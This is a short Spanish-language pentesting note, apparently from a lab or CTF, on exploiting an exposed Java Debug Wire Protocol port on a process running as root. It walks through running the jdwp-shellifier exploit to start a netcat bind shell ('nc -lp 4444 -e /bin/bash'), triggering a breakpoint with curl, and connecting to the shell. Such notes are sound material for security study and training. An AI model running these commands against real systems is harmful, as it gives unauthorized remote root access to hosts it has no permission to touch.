# JDWP (Java Debug Wire Protocol)

Tags: #JDWP

JDWP (Java Debug Wire Protocol o Protocolo de Depuración de Java) es un protocolo de comunicación estándar que forma parte de la Arquitectura del Depurador de la Plataforma Java (JPDA).

NOTA:
	- Exponer el puerto con socat para que funcione bien 

```bash 
# Mostrado por LinPEAS

root         699  0.0  1.7 2528964 34784 ?       Ssl  Oct25   0:01 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java

NOTA: 
	- Al llevar el puerto al exterior no muestra una página web. Pero es un servicio que se puede explotar 
```

## Explotación 
* [jdwp shellifier - exploit](https://github.com/IOActive/jdwp-shellifier)
```bash 
❯ git clone https://github.com/IOActive/jdwp-shellifier && cd jdwp-shellifier

Paso 1: 
# Ejecutar una bindshell 
❯ python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc -lp 4444 -e /bin/bash"

	# t = IP del target (127.0.0.1) ya que se trajo con Chisel 
	# p = Puerto donde se trajo el servicio a Kali con chisel 

Paso 2:
# Triggerear el breakpoint desde otra terminal ejecutando dentro de la máquina víctima 
❯ curl http://127.0.0.1:5000

Paso 3:
# Conectarse con netcat desde Kali 
❯ nc IP_server 4444   # La IP si es la del server y no el localhost de Kali
```
